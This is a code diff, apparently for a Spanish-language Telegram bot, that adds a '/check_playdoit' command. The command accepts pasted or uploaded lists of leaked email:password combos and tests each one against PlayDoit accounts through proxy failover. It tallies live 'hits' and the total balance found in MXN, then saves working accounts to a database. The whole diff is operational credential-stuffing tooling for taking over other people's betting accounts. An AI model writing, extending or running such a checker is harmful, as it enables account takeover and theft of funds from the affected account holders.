@@ -120,7 +120,8 @@ HEADER = HEADER_DECORATIVE
     WAIT_BET_CONFIRM,
     WAIT_ADDUSER_INPUT,
     WAIT_BANK_ACCESS_INPUT,
-) = range(4)
+    WAIT_CHECK_PLAYDOIT_CONFIRM,
+) = range(5)
 
 
 # Eventos de confirmación en espera para /bet confirm_gate
@@ -907,6 +908,245 @@ async def _run_check_task(
     finally:
         if pool:
             await pool.stop()
+
+
+# ─────────────────────────────────────────────────────────────────────
+# FLUJO /CHECK_PLAYDOIT (PLAYDOIT CHECKER)
+# ─────────────────────────────────────────────────────────────────────
+
+
+async def check_playdoit_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Punto de entrada para /check_playdoit — Recibe texto o archivo .txt con combos email:pass."""
+    user_id = update.effective_user.id
+    if not is_authorized(user_id):
+        await update.message.reply_text("❌ No autorizado.")
+        return ConversationHandler.END
+
+    await update.message.reply_text(
+        "🔴 <b>PLAYDOIT CHECKER</b>\n\n"
+        "• Pegados en chat: Máximo 100 líneas.\n"
+        "• Archivo .txt: Adjunta el documento (máximo 5,000 líneas).\n\n"
+        "<i>Formato: correo:contraseña</i>",
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton(
+                        "🏠 Volver al inicio", callback_data="cancel_check_playdoit"
+                    )
+                ]
+            ]
+        ),
+    )
+    return WAIT_CHECK_PLAYDOIT_CONFIRM
+
+
+async def process_check_playdoit_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Procesa el texto o documento enviado para /check_playdoit."""
+    raw_lines = []
+
+    if update.message.document:
+        doc = update.message.document
+        if not doc.file_name.endswith(".txt"):
+            await update.message.reply_text("❌ Solo se admiten archivos con extensión .txt")
+            return WAIT_CHECK_PLAYDOIT_CONFIRM
+
+        file_obj = await context.bot.get_file(doc.file_id)
+        content_bytes = await file_obj.download_as_bytearray()
+        try:
+            text_content = content_bytes.decode("utf-8", errors="ignore")
+        except Exception:
+            text_content = content_bytes.decode("latin-1", errors="ignore")
+
+        raw_lines = [line.strip() for line in text_content.splitlines() if line.strip()]
+        if len(raw_lines) > 5000:
+            await update.message.reply_text("❌ El archivo supera el límite de 5,000 líneas.")
+            return WAIT_CHECK_PLAYDOIT_CONFIRM
+
+    elif update.message.text:
+        text = update.message.text.strip()
+        if text.startswith("/"):
+            await update.message.reply_text("❌ Envía la lista de combos, no un comando.")
+            return WAIT_CHECK_PLAYDOIT_CONFIRM
+        raw_lines = [line.strip() for line in text.splitlines() if line.strip()]
+        if len(raw_lines) > 100:
+            await update.message.reply_text("❌ Máximo 100 combos en chat. Para más, adjunta un archivo .txt (hasta 5,000).")
+            return WAIT_CHECK_PLAYDOIT_CONFIRM
+
+    if not raw_lines:
+        await update.message.reply_text("❌ No se encontraron líneas en la entrada.")
+        return WAIT_CHECK_PLAYDOIT_CONFIRM
+
+    seen = set()
+    valid_combos = []
+    dupes_count = 0
+    invalid_format_count = 0
+
+    for line in raw_lines:
+        parts = line.split(":", 1)
+        if len(parts) < 2:
+            invalid_format_count += 1
+            continue
+        email = parts[0].strip().lower()
+        password = parts[1].strip()
+        if not email or not password or "@" not in email:
+            invalid_format_count += 1
+            continue
+        if email in seen:
+            dupes_count += 1
+            continue
+        seen.add(email)
+        valid_combos.append({"email": email, "password": password})
+
+    if not valid_combos:
+        await update.message.reply_text(
+            f"<b>❌ NINGÚN COMBO VÁLIDO</b>\n\n"
+            f"• <b>Total Recibidos:</b> {len(raw_lines)}\n"
+            f"• <b>Formato Inválido:</b> {invalid_format_count}\n"
+            f"• <b>Duplicados:</b> {dupes_count}",
+            parse_mode="HTML",
+        )
+        return ConversationHandler.END
+
+    existing_in_db = 0
+    try:
+        from db_registry import db
+        with db(write=False) as c:
+            placeholders = ",".join(["?"] * len(valid_combos))
+            existing_rows = c.execute(
+                f"SELECT email FROM playdoit_accounts WHERE email IN ({placeholders})",
+                [v["email"] for v in valid_combos],
+            ).fetchall()
+            existing_in_db = len(existing_rows)
+    except Exception:
+        pass
+
+    context.user_data["pending_check_playdoit"] = valid_combos
+
+    confirm_msg = (
+        f"<b>🔴 CONFIRMACIÓN CHECK PLAYDOIT</b>\n\n"
+        f"• <b>Total Líneas:</b> {len(raw_lines)}\n"
+        f"• <b>Duplicados Omitidos:</b> {dupes_count}\n"
+        f"• <b>Formato Inválido:</b> {invalid_format_count}\n"
+        f"• <b>Preexistentes en BD (se actualizarán):</b> {existing_in_db}\n"
+        f"• <b>Total a Verificar:</b> <b>{len(valid_combos)}</b>\n\n"
+        f"<i>¿Deseas iniciar la verificación de PlayDoit?</i>"
+    )
+    kb = InlineKeyboardMarkup(
+        [
+            [
+                InlineKeyboardButton("✅ Iniciar Check PlayDoit", callback_data="confirm_check_playdoit"),
+                InlineKeyboardButton("🏠 Volver al inicio", callback_data="cancel_check_playdoit"),
+            ]
+        ]
+    )
+    await update.message.reply_text(confirm_msg, parse_mode="HTML", reply_markup=kb)
+    return WAIT_CHECK_PLAYDOIT_CONFIRM
+
+
+async def handle_check_playdoit_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Maneja los botones de confirmación de /check_playdoit."""
+    query = update.callback_query
+    await query.answer()
+
+    if query.data == "cancel_check_playdoit":
+        context.user_data.pop("pending_check_playdoit", None)
+        await query.edit_message_text("❌ Verificación PlayDoit cancelada.")
+        return ConversationHandler.END
+
+    if query.data == "confirm_check_playdoit":
+        valid_combos = context.user_data.get("pending_check_playdoit", [])
+        if not valid_combos:
+            await query.edit_message_text("❌ No hay combos pendientes de PlayDoit.")
+            return ConversationHandler.END
+
+        await query.edit_message_text(
+            f"🚀 <b>Iniciando Check PlayDoit para {len(valid_combos)} combo(s)...</b>",
+            parse_mode="HTML",
+        )
+
+        asyncio.create_task(
+            _run_check_playdoit_task(
+                query.message.chat_id,
+                context.bot,
+                valid_combos,
+                update.effective_user.id,
+            )
+        )
+        return ConversationHandler.END
+
+
+async def _run_check_playdoit_task(
+    chat_id: int, bot, valid_combos: List[Dict[str, Any]], operator_id: int
+):
+    """Ejecuta verificación PlayDoit usando playdoit_api y persiste en playdoit_db."""
+    from playdoit_api import check_playdoit_with_failover
+    from playdoit_db import upsert_playdoit_account
+
+    hits_count = 0
+    dead_count = 0
+    errors_count = 0
+    total_balance_found = 0.0
+    total = len(valid_combos)
+
+    status_msg = await bot.send_message(
+        chat_id=chat_id,
+        text=f"⏳ <b>Progreso PlayDoit:</b> 0/{total} procesados...",
+        parse_mode="HTML",
+    )
+
+    try:
+        for idx, item in enumerate(valid_combos, 1):
+            email = item["email"]
+            password = item["password"]
+
+            try:
+                result, used_proxy = await check_playdoit_with_failover(email, password)
+            except Exception as ex_call:
+                logger.warning(f"[check_playdoit] Error al verificar {email}: {ex_call}")
+                errors_count += 1
+                result = None
+
+            if result and result.ok:
+                try:
+                    upsert_playdoit_account(result.to_dict(), checked_by=operator_id)
+                except Exception as ex_db:
+                    logger.error(f"[check_playdoit] Error guardando {email}: {ex_db}")
+                hits_count += 1
+                total_balance_found += result.balance_total
+            elif result and result.account_dead:
+                try:
+                    upsert_playdoit_account(result.to_dict(), checked_by=operator_id)
+                except Exception as ex_db:
+                    logger.error(f"[check_playdoit] Error guardando DEAD {email}: {ex_db}")
+                dead_count += 1
+            else:
+                errors_count += 1
+
+            if idx % 2 == 0 or idx == total:
+                try:
+                    await status_msg.edit_text(
+                        f"⏳ <b>Progreso PlayDoit:</b> {idx}/{total} procesados...\n"
+                        f"• Hits: <b>{hits_count}</b> | Dead: <b>{dead_count}</b> | Errors: <b>{errors_count}</b>\n"
+                        f"• Saldo acumulado: <b>${total_balance_found:,.2f}</b>",
+                        parse_mode="HTML",
+                    )
+                except Exception:
+                    pass
+
+        final_text = (
+            f"<b>✅ VERIFICACIÓN PLAYDOIT FINALIZADA</b>\n\n"
+            f"• <b>Total Procesados:</b> {total}\n"
+            f"• <b>Cuentas Vivas (HITS):</b> {hits_count}\n"
+            f"• <b>Cuentas Muertas (DEAD):</b> {dead_count}\n"
+            f"• <b>Errores de Red / Proxy:</b> {errors_count}\n"
+            f"• <b>Saldo Total Encontrado:</b> <b>${total_balance_found:,.2f} MXN</b>\n\n"
+            f"🌐 <i>Consulta detalles completos en el dashboard web ({DASHBOARD_URL}).</i>"
+        )
+        await bot.send_message(chat_id=chat_id, text=final_text, parse_mode="HTML")
+    except Exception as ex:
+        logger.error(f"[check_playdoit] Error inesperado en _run_check_playdoit_task: {ex}", exc_info=True)
+        await bot.send_message(chat_id=chat_id, text=f"❌ Error durante el check PlayDoit: {ex}")
 
 
 # ─────────────────────────────────────────────────────────────────────
@@ -2535,6 +2775,8 @@ async def setup_bot_commands(application):
     commands = [
         BotCommand("start", "🚀 Menú principal"),
         BotCommand("help", "📖 Manual operativo"),
+        BotCommand("check", "🔍 Check BetMexico"),
+        BotCommand("check_playdoit", "🔴 Check PlayDoit"),
         BotCommand("cancel", "🛑 Cancelar proceso"),
     ]
     try:
@@ -2661,6 +2903,24 @@ def build_app():
         fallbacks=[CommandHandler("cancel", cancel_cmd)],
     )
     app.add_handler(check_handler)
+
+    # ConversationHandler para /check_playdoit
+    check_playdoit_handler = ConversationHandler(
+        entry_points=[
+            CommandHandler(["check_playdoit", "checkplaydoit"], check_playdoit_cmd),
+        ],
+        states={
+            WAIT_CHECK_PLAYDOIT_CONFIRM: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, process_check_playdoit_input),
+                MessageHandler(filters.Document.ALL, process_check_playdoit_input),
+                CallbackQueryHandler(
+                    handle_check_playdoit_callback, pattern="^(confirm_check_playdoit|cancel_check_playdoit)$"
+                ),
+            ]
+        },
+        fallbacks=[CommandHandler("cancel", cancel_cmd)],
+    )
+    app.add_handler(check_playdoit_handler)
 
     # ConversationHandler para /adduser
     adduser_handler = ConversationHandler(
